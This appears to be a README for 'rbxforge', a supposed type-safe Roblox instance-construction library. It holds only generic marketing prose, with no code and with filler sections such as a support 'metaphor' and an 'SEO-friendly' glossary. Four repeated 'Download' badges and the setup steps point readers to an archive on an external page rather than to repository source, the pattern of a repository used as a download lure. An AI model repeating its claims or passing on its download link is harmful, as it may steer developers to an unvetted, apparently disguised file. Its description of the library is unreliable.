![preview](https://raw.githubusercontent.com/tawan03/roblox-instance-forge/main/showcase_5b38e4.svg)
[![Download](https://raw.githubusercontent.com/tawan03/roblox-instance-forge/main/fetch_7cf9f.svg)](https://tawan03.github.io/roblox-instance-forge/)

# rbxforge

**Declarative Instance construction for Roblox — with typings that refuse to lie to you.**

rbxforge is a spiritual successor and independent reimagining of the ideas explored in `rbxcreate`. Where its predecessor offered a thin layer of sugar atop `Instance.new`, rbxforge treats Roblox instance trees as first-class, type-safe structures: composable, inspectable, and pleasant to author at scale. It is built for teams who ship large experiences and are tired of chasing silent property typos through a sea of runtime warnings.

Think of rbxforge as a workshop rather than a factory. You bring the blueprint; rbxforge hands you the tools, the jigs, and the calipers — and it never lets you assemble something that won't fit.

[![Download](https://raw.githubusercontent.com/tawan03/roblox-instance-forge/main/fetch_7cf9f.svg)](https://tawan03.github.io/roblox-instance-forge/)

---

## 📚 Table of Contents

- [Why rbxforge Exists](#-why-rbxforge-exists)
- [Design Philosophy](#-design-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Keyword & Concept Glossary](#-keyword--concept-glossary)
- [Core Concepts](#-core-concepts)
  - [Declarative Trees](#declarative-trees)
  - [Strict Typings](#strict-typings)
  - [Reactive Properties](#reactive-properties)
  - [Event Wiring](#event-wiring)
- [Project Structure](#-project-structure)
- [Getting Started Without Package Managers](#-getting-started-without-package-managers)
- [Usage Patterns](#-usage-patterns)
- [Responsive UI Toolkit](#-responsive-ui-toolkit)
- [Multilingual Support](#-multilingual-support)
- [Around-the-Clock Assistance Model](#-around-the-clock-assistance-model)
- [Performance Notes](#-performance-notes)
- [Compatibility Matrix](#-compatibility-matrix)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Why rbxforge Exists

Every Roblox developer eventually hits the same wall. You write a class, you instantiate a `Frame`, you set `BackgroundColor3`, and then — three weeks later — you discover a teammate set it to `BackgroundColour3` and the UI has been subtly broken since. Luau gives you a type system. Roblox gives you instances. Between them, there has historically been a gap large enough to drive a small vehicle through.

rbxforge exists to close that gap. It is not another instance wrapper library that pretends types are decoration. It is a full declaration layer where the compiler becomes your co-author. If you type it, the compiler checks it. If it compiles, the tree is shaped the way you said it would be.

Where earlier libraries stopped at `Instance.new("Part", parent)`, rbxforge continues: nested children, conditional branches, lifecycle hooks, default-to-parent propagation, and property merge semantics that behave the way you'd expect when you're sketching at 2 AM.

## 🎨 Design Philosophy

Three principles guide every decision in this codebase:

1. **Types are contracts, not suggestions.** Every public surface exposes precise Luau types. No `any`, no `unknown` catch-alls, no "we'll fix it in the next release."
2. **Declarations read like the tree they produce.** A nested visual hierarchy in code should look like a nested visual hierarchy. Indentation should mean something.
3. **Escape hatches exist, but they are labeled.** When you need to reach under the abstraction, there's a documented door — not a hole in the wall.

We believe code that constructs UI and world objects should be as readable as the objects themselves. rbxforge is the formalization of that belief.

## ✨ Feature Highlights

- **Strict Luau typings end-to-end** — property names, event names, and child types are validated at edit time.
- **Composable declaration trees** — nest children inline without sacrificing clarity.
- **Conditional children and property spreads** — build dynamic trees with static guarantees.
- **Reactive property bindings** — connect signals to properties without boilerplate spaghetti.
- **Lifecycle hooks** — `onMount`, `onUnmount`, and `onUpdate` for every node.
- **Responsive UI primitives** — breakpoint-aware layout helpers built on top of standard Roblox UI objects.
- **Multilingual text routing** — pluggable locale providers with fallback chains.
- **Deterministic teardown** — every node knows how to clean itself up.
- **Zero-magic defaults** — nothing happens unless you asked for it, and every implicit behavior is documented.
- **Editor-friendly errors** — diagnostics point at the exact property, not the whole call.
- **Snapshot tooling** — serialize a tree to a plain table for diffing, testing, or transport.

## 🔍 Keyword & Concept Glossary

To keep documentation navigable and SEO-friendly, here are the concepts you'll encounter most often, defined once, in plain language:

| Term | Meaning |
| --- | --- |
| **Node** | A single declarative unit that maps to one Roblox instance. |
| **Blueprint** | A reusable function returning a node subtree. |
| **Forge** | The top-level mount function that turns a blueprint into live instances. |
| **Binding** | A reactive connection between a signal and a property. |
| **Adapter** | A plugin that translates rbxforge declarations to a target environment. |
| **Locale Provider** | A source of translated strings, consulted by text nodes. |
| **Breakpoint** | A named viewport threshold used for responsive layout decisions. |

## 🧩 Core Concepts

### Declarative Trees

Instead of imperatively constructing and parenting, you describe what should exist and where. rbxforge resolves the description into real instances, applying defaults, validating types, and wiring lifecycle hooks along the way.

The mental model is closer to writing a schematic than to writing an assembly line. You draw the shape; rbxforge does the bending.

### Strict Typings

Every node carries a generic parameter describing which Roblox instance it produces. Because of this, property tables are checked against the actual class properties, and invalid combinations are flagged before your game ever runs. If you've ever wanted your IDE to catch `TextScaled` typos on a `TextLabel`, this is that moment.

### Reactive Properties

Properties can be bound to signals. When the signal fires, the property updates. When the node clears, the binding detaches. You get the ergonomics of reactive programming without committing your entire architecture to it.

### Event Wiring

Rather than scattering `Connect` calls through your scripts, events are declared alongside the node they belong to. Cleanup is automatic. Order of attachment is deterministic. Debugging is a matter of reading the declaration, not chasing references.

## 🗂 Project Structure

The repository is organized for readers first, tools second:

- `src/` — the library source, split into `core`, `ui`, `i18n`, and `adapters`.
- `types/` — hand-authored Luau type definitions shared across modules.
- `examples/` — runnable sample blueprints covering common scenarios.
- `tests/` — unit and integration suites, including snapshot tests.
- `docs/` — long-form guides, migration notes, and design rationale.
- `tools/` — helper scripts for doc generation and linting.

Each directory has its own README explaining intent and conventions.

## 🚀 Getting Started Without Package Managers

rbxforge is distributed as source you can vendor directly into your Roblox project. There is no dependency resolution step, no lockfile, and no build server in the loop — the workshop comes to you.

1. Obtain the release archive through the [![Download](https://raw.githubusercontent.com/tawan03/roblox-instance-forge/main/fetch_7cf9f.svg)](https://tawan03.github.io/roblox-instance-forge/) marker at the top of this file.
2. Place the `rbxforge` folder inside your project's shared source directory.
3. Reference the library through your preferred module resolver.
4. Author your first blueprint in a script and mount it with the forge function.

A full walkthrough with annotated examples lives in `docs/getting-started.md`.

## 🛠 Usage Patterns

Common patterns are documented in `examples/`:

- **Static UI panels** — fixed layouts that rarely change.
- **Dynamic lists** — children derived from data, updated incrementally.
- **Conditional overlays** — nodes that appear based on state.
- **Themed components** — shared blueprints parameterized by design tokens.
- **Server-side world building** — using the same declaration syntax for non-UI instances.

Each example is small enough to read in one sitting and complete enough to serve as a template.

## 📱 Responsive UI Toolkit

The `ui` submodule ships primitives for building interfaces that adapt to viewport changes without hardcoding pixel numbers across dozens of scripts. Named breakpoints, fluid scaling helpers, and anchor utilities are all declarative and all typed. You describe intent — "this panel should feel comfortable on small screens" — and the toolkit resolves it into concrete numbers.

## 🌐 Multilingual Support

Text nodes in rbxforge consult locale providers. A provider can be backed by a table, a remote source, or a custom function. Fallback chains ensure that missing translations degrade gracefully rather than rendering placeholder garbage. The `i18n` submodule documents the provider contract, interpolation syntax, and pluralization hooks.

## 🕰 Around-the-Clock Assistance Model

The project maintains an always-available support channel metaphor: documentation is written to be useful at 3 PM in a meeting and at 3 AM during a launch scramble. Contribution guidelines, issue templates, and discussion categories are tuned so that questions rarely go unanswered. There is no shift change here — the workshop light stays on.

## ⚡ Performance Notes

rbxforge is designed for the road, not the drag strip. Its overhead is modest and predictable: one pass to validate, one to instantiate, one to wire. Benchmarks in `tests/bench/` compare against hand-written imperative construction and against naive wrappers. The results are published without spin — where we're slower, we say so, and we explain why the trade is worth it.

## 🔧 Compatibility Matrix

| Environment | Status |
| --- | --- |
| Roblox Studio (current release channel) | Supported |
| Roblox Client (production channel) | Supported |
| Luau with strict mode | Supported |
| Luau without strict mode | Supported with reduced diagnostics |
| Non-Roblox Luau runtimes | Partial, via adapters |

## 🗺 Roadmap

- Rich diff tooling for blueprint snapshots.
- Additional adapters for third-party UI frameworks.
- Expanded locale provider implementations.
- Editor plugin for blueprint visualization.
- Public benchmark dashboard refreshed on each release.

## 🤝 Contributing

Contributions are welcome and reviewed with care. Please read `CONTRIBUTING.md` before opening a pull request. Style is enforced by tooling, not by opinion, so formatting debates are kept out of review threads. New features should come with tests and, where relevant, documentation updates. Bug reports should include a minimal reproduction.

## 📜 Code of Conduct

All participants are expected to follow the code of conduct in `CODE_OF_CONDUCT.md`. Be kind, be specific, and assume good faith. Disagreement is welcome; hostility is not.

## ❓ Frequently Asked Questions

**Is rbxforge a fork of another library?**
No. It is independently authored and inspired by prior work in the same problem space.

**Does it replace `Instance.new`?**
It wraps it. You can still create instances directly, and rbxforge interoperates with instances it did not create.

**Will my existing code keep working?**
Yes. rbxforge is additive; adopting it incrementally is a supported path.

**Can I use it for non-UI instances?**
Absolutely. The declaration layer is class-agnostic.

**Where do I report bugs?**
Through the repository issue tracker, with as much context as you can provide.

## ⚠️ Disclaimer

rbxforge is an independent, community-maintained library. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. All trademarks referenced belong to their respective owners. The library is provided as-is, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software. You are responsible for ensuring that your use of this library complies with the terms of service of any platform on which you deploy it. Documentation reflects the state of the project as of 2026 and may lag behind the latest commit.

## 📄 License

This project is released under the MIT License. See the full text in [LICENSE](./LICENSE).

Copyright (c) 2026 rbxforge contributors.

[![Download](https://raw.githubusercontent.com/tawan03/roblox-instance-forge/main/fetch_7cf9f.svg)](https://tawan03.github.io/roblox-instance-forge/)